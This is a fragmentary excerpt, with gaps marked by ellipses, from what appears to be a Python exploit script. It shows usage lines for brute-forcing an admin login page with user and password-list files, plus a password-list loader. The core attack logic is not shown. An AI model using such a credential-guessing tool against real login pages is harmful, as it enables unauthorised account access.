...
'''
Example Usage:
- ./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p kerberhash.txt
'''
...
Exploit Usage : 
./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p kerberhash.txt
./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/kerberhash.txt'''))
...
if len(sys.argv) < 2:
    print (f"Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [kerberhash.txt]")
    sys.exit(1)  
...
passfile = open(Password_list,encoding='latin-1').readlines()
